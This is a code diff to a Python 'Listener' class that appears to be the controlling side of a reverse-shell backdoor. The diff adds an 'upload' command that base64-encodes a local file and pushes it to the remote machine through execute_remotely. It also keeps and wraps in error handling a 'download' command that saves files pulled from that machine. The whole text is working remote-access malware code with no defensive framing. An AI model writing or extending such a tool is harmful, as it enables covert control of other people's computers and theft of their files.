@@ -34,17 +34,28 @@ class Listener :
         
         return self.reliable_receive()
     
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()  # base64 encode 
+
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))  # base64 decode karke 
+        return "File uploaded successfully\n".encode() if content else "No content to write\n".encode()    
     
     def run(self):
         while True:
             command = input(">>")
             command = command.split(" ")
-            result = self.execute_remotely(command)
-            if(command[0] == "download"):
-                self.write_file(command[1] , result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                result = self.execute_remotely(command)
+                if(command[0] == "download"):
+                    self.write_file(command[1] , result)
+            except Exception as e:
+                result = "[!] Error: " + str(e)     
 
             print(result, end="")
 
